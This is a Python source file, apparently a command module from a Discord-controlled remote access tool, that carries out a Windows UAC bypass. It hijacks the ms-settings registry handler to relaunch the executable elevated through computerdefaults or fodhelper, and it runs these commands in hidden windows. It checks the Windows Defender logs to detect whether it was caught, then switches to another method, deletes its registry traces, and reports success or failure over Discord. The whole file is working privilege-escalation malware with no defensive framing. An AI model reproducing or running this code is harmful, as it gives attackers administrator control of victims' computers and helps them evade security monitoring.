import subprocess
import ctypes
import sys
import discord

def GetSelf() -> tuple[str, bool]:
    """Get current executable path and whether it's frozen"""
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

def IsAdmin() -> bool:
    """Check if current process has admin privileges"""
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

def execute_command(cmd):
    """Execute command with hidden window"""
    return subprocess.run(cmd, shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

def UACbypass(method: int = 1) -> bool:
    """Attempt UAC bypass using different methods"""
    if GetSelf()[1]:  # Only if executable is frozen
        if method == 1:
            # Method 1: computerdefaults bypass
            execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
            execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
            
            log_count_before = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute_command("computerdefaults --nouacbypass")
            log_count_after = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            
            execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
            
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
                
        elif method == 2:
            # Method 2: fodhelper bypass
            execute_command(f'reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /d "{sys.executable}" /f')
            execute_command('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f')
            
            log_count_before = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute_command("fodhelper --nouacbypass")
            log_count_after = len(execute_command('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            
            execute_command("reg delete hkcu\\Software\\Classes\\ms-settings /f")
            
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True
    return False

# Main execution
if IsAdmin():
    # Already admin, no need to bypass
    embed = discord.Embed(
        title="🟢 UAC Status",
        description="```Already running with administrator privileges```",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)
else:
    # Attempt UAC bypass
    success = UACbypass()
    
    if success:
        embed = discord.Embed(
            title="🟢 UAC Bypass Successful",
            description="```UAC has been successfully bypassed!```",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="🔴 UAC Bypass Failed",
            description="```Failed to bypass UAC protection```",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)